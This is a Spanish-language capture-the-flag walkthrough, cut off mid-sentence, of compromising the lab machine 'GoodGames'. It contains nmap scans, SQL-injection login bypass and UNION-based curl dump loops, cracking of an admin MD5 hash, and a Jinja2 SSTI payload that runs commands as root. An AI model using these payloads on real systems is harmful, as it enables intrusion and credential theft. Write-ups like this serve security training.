`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.130 -oG allPorts`

```ad-done
80/tcp open  http    syn-ack ttl 63
```

`nmap -p80 -sCV 10.10.11.130 -oN targeted`

```ad-done
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```

`whatweb http://10.10.11.130`

Encontramos un icono de un usuario para hacer login, junto con un panel de registro

### SQL Injection

Usaremos [[BURPSUITE]] para interceptar el trafico y poder manipularlo

Interceptamos le trafico del login con burpsuite y le añadimos después del email `' or 1=1-- -`
Al enviarlo obtenemos una respuesta en la que se intenta setear una cookie de sesión

Y mas para abajo nos muestra
`Welcome admin`

Así que eso quiere decir que es vulnerable a una inyección sql

Estaremos accediendo como administrador a la pagina web

Desde dentro del panel de administración podemos acceder a un login de `Flask Volt`

Con searchexploit buscamos si hay algún tipo de vulnerabilidad afectada a este servicio, no encontramos nada relacionado

EN la misma consulta anterior de la inyección SQL vamos a hacer una enumeración de las bases de datos para buscar usuarios y a posterior buscar reutilización de credenciales y poder usarlos en este panel de login

Haciendo un ordenamiento de los datos basándonos en el numero de columnas encontramos que la respuesta diferente se acontece en la columna numero 4
`' order by 4-- -`

Ahora sabiendo el total de columnas vamos a seleccionar el total de columnas existentes
`' union select 1,2,3,4-- -`

Me esta devolviendo un `Welcome 4`, si el `4` de la petición lo modificamos por un `test` nos devolverá un `welcomne test`

Probaremos viendo si resuelve la siguiente petición de comprobación de SSTI
`' union select 1,2,3,"{{7*7}}"-- -`

Al no tramitarlo y devolver un 49 no es un punto de SSTI

Ahora probaremos haciendo la petición para que nos muestre el nombre de la base de datos
`' union select 1,2,3,database()-- -`

Nos muestra el nombre de esta
`welcome main`

Para que nos diga todas las bases de datos usaremos
`' union select 1,2,3,schema_name from information_schema.schemata-- -` 

Nos muestra el nombre de 
`information_schema` y `main`

Vamos a enumerar la base de datos llamada main
Enumerar tablas existentes
`' union select 1,2,3,table_name from information_schema.tables-- -`

Al enumerarlas así se nos muestran todas juntas así que vamos a hacer que se nos enumeren de una forma en las que sean legibles
```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
```

Para enumerar solo la tabla main
```bash
 for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
```

Encontramos
`blog`, `blog_comments`, `user`

Enumeraremos ahora las columnas de user
```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,column_name from information_schema.columns where table_schema=\"main\" and table_name=\"user\" limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
```

Encontramos
`email`, `id`, `name`, `password`


Enumeraremos el contenido de las siguientes columnas
```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user limit $i,1-- -&password=test" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
```

Obtendremos las credenciales del usuario admin
```ad-hint
admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
```

La contraseña esta crakeada así que vamos a ver que tipo de hash es para verla en texto claro
`hash-identifier 2b22337f218b2d82dfc3b6f77e7cb8ec`

Nos dice que es `MD5`

Hasi que vamos a crakearla con fuerza bruta

### Fuerza Bruta

Usaremos [[JOHN THE RIPPER]] para romper el hash y obtener la contraseña
`john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5`

Obtendremos la contraseña del usuario administrador

```ad-hint
admin::superadministrator
```


Conseguiremos entrar en la web `http://internal-administration.goodgames.htb/index`

En Settings encontramos un campo en el que podemos introducir valores, vamos a hacer una prueba de si nos interpreta por ejemplo `{{7*7}}`

Nos muestra 48 esto quiere decir que es vulnerable a SSTI

### SSTI (Server Side Template Injection )

Navegamos a `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2`

Y hay encontraremos payloads que nos ayuden con la explotación de este campo
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

Con este payload obtendremos el resultado del comando `id` la respuesta es
`uid=0(root) gid=0(root) groups=0(root)`

Eso quiere decir que somos root y podemos ejecutar comandos en la maquina victima

Usaremos 
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('hostname -I').read() }}`

Y nos muestra un IP que n